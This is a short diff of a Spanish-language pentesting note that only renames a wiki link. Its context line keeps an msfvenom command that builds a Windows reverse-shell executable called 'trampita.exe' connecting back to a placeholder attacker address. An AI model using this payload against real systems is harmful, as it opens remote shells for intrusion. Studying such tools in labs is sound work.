@@ -1,4 +1,4 @@
-Vamos a utilizar [[msfvenom]], para crearnos un payload que esté hecho para Windows:
+Vamos a utilizar [[Msfvenom]], para crearnos un payload que esté hecho para Windows:
 
 `msfvenom -p windows/x64/shell_reverse_tcp LHOST=myIP LPORT=port -f exe -o trampita.exe`
 
